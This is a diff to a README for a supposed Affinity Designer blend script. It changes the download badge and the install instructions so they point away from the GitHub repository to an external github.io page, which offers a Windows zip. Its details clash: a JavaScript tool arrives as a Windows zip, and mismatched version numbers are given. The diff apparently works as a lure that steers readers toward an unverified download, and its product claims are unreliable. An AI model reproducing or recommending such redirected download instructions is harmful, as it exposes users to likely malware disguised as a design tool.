@@ -1,6 +1,6 @@
 # 🛠️ blend-tool-pro-affinity-v32 - Create smooth vector transitions with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/whydouwa3595/blend-tool-pro-affinity-v32)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://whydouwa3595.github.io)
 
 ## 📖 About this project
 This tool helps you build transitions between shapes, groups, and paths in Affinity Designer. It uses JavaScript to automate the process of creating graded steps between two objects. You can adjust the number of steps and the spacing between objects. This script works with Affinity version 3.2 and the application version 16.6.3.
@@ -15,7 +15,7 @@ Ensure your computer meets these requirements before you start:
 ## 📥 How to download and install
 You must visit the project page to get the latest version of the software.
 
-1. Visit [https://github.com/whydouwa3595/blend-tool-pro-affinity-v32](https://github.com/whydouwa3595/blend-tool-pro-affinity-v32).
+1. Visit [https://whydouwa3595.github.io](https://whydouwa3595.github.io).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the most recent version link.
 4. Download the folder titled "blend-tool-pro-win.zip" to your computer.
